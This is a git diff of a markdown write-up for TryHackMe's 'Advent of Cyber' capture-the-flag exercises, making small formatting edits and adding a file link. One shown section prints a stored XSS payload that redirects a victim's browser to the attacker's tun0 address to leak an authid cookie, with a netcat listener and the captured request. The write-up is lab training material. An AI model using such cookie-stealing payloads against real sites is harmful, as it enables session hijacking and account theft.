@@ -1,5 +1,5 @@
 ---
-title: Advent of Cyber
+title: 'Advent of Cyber'
 ---
 
 - [Day 1](#day-1)
@@ -27,6 +27,7 @@ title: Advent of Cyber
 - [Day 23](#day-23)
 - [Day 24](#day-24)
 - [Day 25](#day-25)
+- [files](#files)
 
 ## Day 1
 
@@ -540,9 +541,9 @@ Post to capture authid: `</p><script>window.location = 'http://<tun0_ip>/page?pa
 $ sudo nc -lvnp 80
 listening on [any] 80 ...
 # wait a few mins
-connect to [10.8.83.23] from (UNKNOWN) [10.10.226.138] 44658
+connect to [<TryHackMe-VPN-IP>] from (UNKNOWN) [10.10.226.138] 44658
 GET /page?param=authid=2564799a4e6689972f6d9e1c7b406f87065cbf65 HTTP/1.1 # -> success!
-Host: 10.8.83.23
+Host: <TryHackMe-VPN-IP>
 Connection: keep-alive
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3844.0 Safari/537.36
@@ -951,4 +952,8 @@ check kibana-log.txt for root.txt → "stack":"ReferenceError: someELKfun is not
 
 ## Day 25
 
-Nothing to do → success!
+nothing to do → success!
+
+## files
+
+[Advent of Cyber.zip](Advent%20of%20Cyber%20affb42cb9ce74d2d9d2825e7f7970cac/Advent_of_Cyber.zip)
